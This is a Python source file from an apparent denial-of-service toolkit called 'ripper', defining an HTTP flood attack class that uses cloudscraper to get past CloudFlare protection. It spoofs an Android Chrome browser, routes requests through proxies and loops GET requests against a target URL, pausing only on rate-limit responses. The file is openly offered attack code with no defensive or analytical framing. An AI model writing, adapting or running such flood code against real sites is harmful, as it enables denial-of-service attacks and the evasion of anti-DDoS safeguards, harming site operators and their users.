import time
from contextlib import suppress

from cloudscraper import CloudScraper, create_scraper
from requests import Response

from ripper.actions.http_flood import HttpFlood
from ripper.context.target import Target
from ripper.context.events_journal import EventsJournal

# Forward Reference
Context = 'Context'

events_journal = EventsJournal()


class RateLimitException(BaseException):
    """Exception raised for rate limit response."""

    code: int
    """Error code"""
    message: str
    """Description of the error"""

    def __init__(self, code: int, message: str):
        self.code = code
        self.message = message
        super().__init__(self.message)

    def __str__(self):
        return f'{self.code}: {self.message}'


class HttpBypass(HttpFlood):
    """HTTP Flood method with CloudFlare bypass ."""

    name: str = 'HTTP Flood with CloudFlare bypass'
    label: str = 'http-bypass'

    _http_connect: CloudScraper = None

    def __init__(self, target: Target, context: Context):
        super().__init__(target, context)

    def __call__(self, *args, **kwargs):
        browser = {
            'browser': 'chrome',
            'platform': 'android',
            'desktop': False
        }
        with suppress(Exception), create_scraper(browser=browser) as self._http_connect:
            self._target.stats.connect.status_success()
            events_journal.info('Creating CloudFlare scraper connection.', target=self._target)
            while self.send(self._http_connect):
                if self._ctx.dry_run:
                    break
                continue
            self._target.stats.connect.status_failed()

    def send(self, scraper: CloudScraper):
        try:
            with scraper.get(self._target.url(),
                             headers=self._ctx.headers_provider.headers,
                             proxies=self._proxy) as response:
                self._target.stats.http_stats[response.status_code] += 1
                self.check_rate_limit(response)
        except RateLimitException as e:
            events_journal.warn(
                f'{type(e).__name__} {e.__str__()}, sleep for 3 sec', target=self._target)
            time.sleep(3.01)
            return True
        except Exception as e:
            events_journal.exception(e, target=self._target)
        else:
            sent_bytes = self._size_of_request(response.request)
            self._target.stats.packets.status_sent(sent_bytes)
            self._proxy.report_success() if self._proxy is not None else 0
            return True
        return False

    @staticmethod
    def check_rate_limit(response: Response):
        """Check status code for Rate limits applied and throws exception."""
        if response.status_code in [429, 460, 463, 520, 521, 522, 523, 524, 525, 526, 527]:
            raise RateLimitException(response.status_code, response.reason)

    @staticmethod
    def _size_of_request(request) -> int:
        size: int = len(request.method) +\
                    len(request.url) + \
                    len('\r\n'.join(f'{k}: {v}' for k, v in request.headers.items()))
        return size
